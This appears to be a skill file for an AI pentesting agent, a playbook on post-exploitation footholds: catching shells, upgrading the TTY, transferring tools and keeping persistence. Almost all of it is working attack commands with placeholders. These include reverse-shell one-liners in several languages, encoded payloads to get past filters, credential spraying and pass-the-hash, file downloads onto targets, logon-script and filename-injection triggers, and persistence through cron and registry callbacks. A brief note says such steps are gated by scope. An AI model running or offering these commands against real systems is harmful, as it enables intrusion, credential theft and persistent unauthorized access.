---
name: Foothold And Shell Upgrade
description: Turn code-exec into a stable, fully-interactive shell — reverse-shell one-liners, catchers, TTY upgrade, Windows shells, and file transfer to bootstrap post-exploitation.
tags: [post-exploitation, reverse-shell, tty-upgrade, foothold, file-transfer, pivoting, windows, powershell]
recommended_tools: [execute_command, python3, curl]
vuln_classes: []
domain: post-exploitation
phase: exploitation
---
# Foothold And Shell Upgrade

You have code-exec (RCE param, deserialization, SSTI, webshell, `xp_cmdshell`, cron, SUID, etc.).
Goal: convert it into a **stable interactive shell** you can run `sudo`, editors, `su`, and
priv-esc tooling from. Order of operations: **catch → upgrade TTY → transfer tooling → stabilise**.

Placeholders: `<IP>` = your listener, `<PORT>` = your listen port, `<TARGET>` = victim,
`<URL>` = your HTTP server, `<USER>`/`<PASS>`/`<HASH>`.

Safety: reverse shells, writes, and persistence are HITL-gated and scope-bound. Start your catcher
first, keep the exec channel for retries, and prefer read-only proof (`id`,`hostname`) before pivoting.

## Start the catcher first

Never fire a payload with no listener up. Pick by what you need.

```bash
# raw netcat — fast, but dies on Ctrl-C and gives no TTY
nc -lvnp <PORT>
rlwrap nc -lvnp <PORT>            # +readline: arrow keys / history without full upgrade

# pwncat-cs — auto-upgrades TTY, has upload/download, persistence (PREFERRED)
pwncat-cs -lp <PORT>

# metasploit multi/handler — for meterpreter or staged payloads
msfconsole -qx "use multi/handler; set payload linux/x64/shell_reverse_tcp; \
  set LHOST <IP>; set LPORT <PORT>; run"
```

**Proof:** listener prints `connect to [...] from <TARGET>`; you get a prompt; `id` returns a `uid=`.

## Direct login with recovered creds/keys (MOST COMMON path)

Before reaching for a reverse shell: if you hold a password, hash, or private key and a login
service is open, **log in directly** — it is faster and gives a stable shell for free. In practice
most footholds come from a cracked/leaked/reused credential, not from raw RCE. Password reuse
(DB/app/config password matching a system account) is the single most frequent case — always try it.

```bash
# --- Linux: creds ---
netexec ssh <TARGET> -u <USER> -p '<PASS>'                 # validate first: [+] valid, (Pwn3d!) = shell
sshpass -p '<PASS>' ssh <USER>@<TARGET>                    # non-interactive password login
su - <USER>                                                # already on-box; su fails inside firejail/jails
# unknown username, one known password -> spray a candidate list:
netexec ssh <TARGET> -u users.txt -p '<PASS>' --continue-on-success

# --- Linux: private key (from file-read, backup archive, /proc traversal) ---
chmod 600 id_rsa; ssh -i id_rsa <USER>@<TARGET>

# --- Windows: WinRM (5985), the default when user is in Remote Management Users ---
netexec winrm <TARGET> -u <USER> -p '<PASS>'               # (Pwn3d!) confirms WinRM access
evil-winrm-py -i <TARGET> -u <USER> -p '<PASS>'
evil-winrm-py -i <TARGET> -u <USER> -H <HASH>              # pass-the-hash (also gMSA:  -u svc$ -H <HASH>)

# --- Windows: Kerberos-only DC / account in Protected Users (NTLM blocked) ---
netexec smb <TARGET> -u <USER> -p '<PASS>' -k --generate-krb5-file krb5.conf
export KRB5_CONFIG=krb5.conf; evil-winrm-py -i <TARGET> -u <USER> -p '<PASS>' -k --ssl
kinit <USER>; evil-winrm -i <DC_HOST> -r <DOMAIN>          # realm mode alternative

# --- Windows: valid creds but NO WinRM (local logon only) -> reverse shell via RunasCs ---
.\RunasCs.exe <USER> '<PASS>' cmd -r <IP>:<PORT>           # add -d <DOMAIN> for domain users

# --- Windows: RDP (GUI-gated escalation, kiosk/blank-password accounts) ---
xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET>:3389
xfreerdp /v:<TARGET> /dynamic-resolution +clipboard -sec-nla    # NLA-less / blank kiosk
```

Gated-login edge cases:
- **SSH 2FA with recovered TOTP seed:** `oathtool -b --totp <SEED> --now="$(date ...)"`, then `ssh`.
- **`/bin/false` shell but SSH auth works:** forward a local socket instead of a shell —
  `ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 <USER>@<TARGET>`, then hit the service locally.
- **Vault SSH-OTP role:** `VAULT_ADDR`/`VAULT_TOKEN` set, then `vault ssh --role <ROLE> --mode otp <USER>@<TARGET>`.

**Proof:** interactive prompt as `<USER>`; `user.txt`/`root.txt` readable; netexec prints `[+]`/`(Pwn3d!)`.

## Linux reverse-shell one-liners

Try in order — first that lands wins. Prefer the shell/lang the box already runs.

```bash
# bash /dev/tcp (no binary needed; most common)
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'          # when quoting mangles redirection
# sh fallback (dash has no /dev/tcp — use a named FIFO)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# netcat variants
nc <IP> <PORT> -e /bin/bash                              # -e present (traditional/openbsd-with-e)
nc.traditional <IP> <PORT> -e /bin/bash

# python (2 or 3) — reliable, present almost everywhere
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# perl / php / ruby fallbacks
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");loop{c.gets.chomp!;(exec(c.gets)rescue c.puts $!)}'
```

Encoding when the exec channel eats `<`, `>`, `&`, spaces, or quotes:

```bash
# base64 the whole payload, decode+run on target (survives most WAF/param mangling)
echo -n 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64
# on target:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8uLi4=|base64 -d|bash
```

**Proof:** catcher receives the connection and `id`/`hostname -f` return live output.

## Upgrade to a full TTY (do this immediately)

A raw shell breaks `sudo`, `su`, `ssh`, `vim`, tab-complete, and Ctrl-C. Upgrade before anything else.

```bash
# 1) spawn a pty on the target
python3 -c 'import pty;pty.spawn("/bin/bash")'
#    fallbacks if no python:
script -qc /bin/bash /dev/null
/usr/bin/expect -c 'spawn /bin/bash;interact'

# 2) background the shell, fix your local terminal, foreground it
#    (type these in YOUR terminal)
export TERM=xterm-256color         # on target, before backgrounding — enables clear/vim
# Ctrl-Z
stty raw -echo; fg
#    (press Enter twice — the reset() clears the mangled line)

# 3) match rows/cols so full-screen apps render (get values with `stty size` locally)
stty rows <R> cols <C>             # run on target
```

pwncat-cs and meterpreter (`shell` then `Ctrl-Z`, `sessions -u`) do this automatically — prefer them.

**Proof:** `Ctrl-C` no longer kills the shell, `sudo -l` prompts correctly, arrow keys and tab work.

## Windows reverse shells

```powershell
# PowerShell TCP one-liner (classic Nishang-style)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sr=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sr,0,$sr.Length);$s.Flush()}"
```

```bash
# base64-encode UTF-16LE for -EncodedCommand (defeats quoting/AMSI-lite param filters)
echo -n '<the powershell above>' | iconv -t UTF-16LE | base64 -w0
# on target:  powershell -nop -e <BASE64>
```

For a **real interactive Windows TTY** (tab-complete, arrows, colors), use ConPtyShell:

```powershell
# on your box:  stty raw -echo; (stty size); nc -lvnp <PORT>
IEX(IWR -UseBasicParsing <URL>/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell <IP> <PORT> <ROWS> <COLS>
```

Nishang `Invoke-PowerShellTcp` and `powercat -c <IP> -p <PORT> -e cmd` are drop-in alternatives.

**Proof:** listener catches a `PS <path>>` prompt; `whoami /priv` and `hostname` return output.

## File transfer (get tooling onto the target)

Stand up a server on your box, then pull. Match the transfer to what the target has.

```bash
# your box — HTTP server for pulls
python3 -m http.server 80
# or impacket SMB (Windows-friendly, no browser needed)
impacket-smbserver share $(pwd) -smb2support -user <USER> -password <PASS>
```

### Linux pull

```bash
wget <URL>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
curl -s <URL>/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy
# no wget/curl: bash /dev/tcp downloader
exec 3<>/dev/tcp/<IP>/80; echo -e "GET /f HTTP/1.0\r\n\r" >&3; cat <&3 > /tmp/f
```

### Windows pull

```powershell
certutil -urlcache -split -f <URL>/nc.exe C:\Windows\Temp\nc.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('<URL>/nc.exe','C:\Windows\Temp\nc.exe')"
powershell -c "IWR <URL>/PowerUp.ps1 -OutFile C:\Windows\Temp\pu.ps1"
# from an impacket SMB share:
copy \\<IP>\share\winPEASx64.exe C:\Windows\Temp\
```

### No network egress — inline via base64

```bash
# your box: base64 -w0 tool > tool.b64  (paste into the shell)
echo <BASE64> | base64 -d > /tmp/tool && chmod +x /tmp/tool          # Linux
```
```powershell
[IO.File]::WriteAllBytes("C:\Windows\Temp\t.exe",[Convert]::FromBase64String("<BASE64>"))
```

**Proof:** `md5sum`/`Get-FileHash` on the target matches the source; the tool runs.

## No-interactive / restricted-shell quirks

- **Command runs but no callback:** egress filtered. Try common allowed ports (`443`,`80`,`53`,`8080`)
  as `<PORT>`; if all blocked, pivot the shell over DNS/ICMP or use the exec channel as the shell.
- **Payload runs once then the request hangs:** the HTTP thread blocks on the shell. Fork/background:
  append `&` or wrap in `nohup ... &` / `setsid`.
- **`rbash`/restricted shell:** escape via `vi` (`:!/bin/bash`), `python3 -c 'pty...'`, `awk 'BEGIN{system("/bin/sh")}'`,
  or an allowed binary's shell (`less`,`man`,`find -exec`). Then set `export PATH=/bin:/usr/bin`.
- **Quotes/spaces stripped by the sink:** base64 the payload (above) or use `${IFS}` for spaces.
- **`sudo`/`su` say "no tty":** you skipped the TTY upgrade — do the `stty raw -echo; fg` dance.

## Delivery-based exec (planted-payload triggers)

When an automated process consumes attacker-supplied input, embed the reverse-shell trigger and wait
for it to fire. Reuse the staged download+exec pattern; keep a listener up.

- **SYSVOL logon-script poisoning:** overwrite `<DOMAIN>/scripts/login.vbs` with a base64-PS reverse-shell VBS —
  `smbclient //<TARGET>/SYSVOL -c 'cd <DOMAIN>/scripts; put login-revshell.vbs login.vbs'`. Fires on victim logon.
- **Archive/filename injection** (e.g. FontForge CVE-2024-25082): craft a ZIP whose member name is
  `$(<cmd>).ttf` so a cron/processing job passes it to a shell. Proof: marker file / shell as the job user.
- **Malicious documents:** LibreOffice ODT with an `Open`-event Basic macro, or a signed lecture ZIP with a
  `.url` shortcut, opened by a grading/eval bot. Proof: shell as the processing user.
- **CI pipeline:** TeamCity personal-build diff / Jenkins-Groovy build step that downloads and runs `nc`.
  Proof: shell as the build service account (e.g. `svc_teamcity`).

**Proof:** listener catches a callback as the automated-process account after the trigger runs.

## Persistence-lite (only where scope allows)

Cheap re-entry so you don't re-exploit on every disconnect. Get explicit sign-off first.

```bash
# authorized_keys (if writable & you have a keypair)
mkdir -p ~/.ssh; echo '<YOUR_PUBKEY>' >> ~/.ssh/authorized_keys
# cron callback (user or /etc/cron.d)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")|crontab -
```
```powershell
# Windows Run key (per-user, no admin)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v u /d "powershell -w hidden -e <BASE64>" /f
```

**Proof:** disconnect, wait one interval / re-login, and the catcher receives a fresh callback.

## Chaining

Stable shell → `sudo -l` / linpeas / winPEAS → privilege escalation (SUID, cron, capabilities,
kernel, `AlwaysInstallElevated`, unquoted service paths) → credential harvest → lateral movement.
Feeds: **command-injection**, **insecure-deserialization**, **file-upload** (webshell), **smb-ntlm**,
and **active-directory** skills. Always upgrade the TTY before running interactive priv-esc tooling.
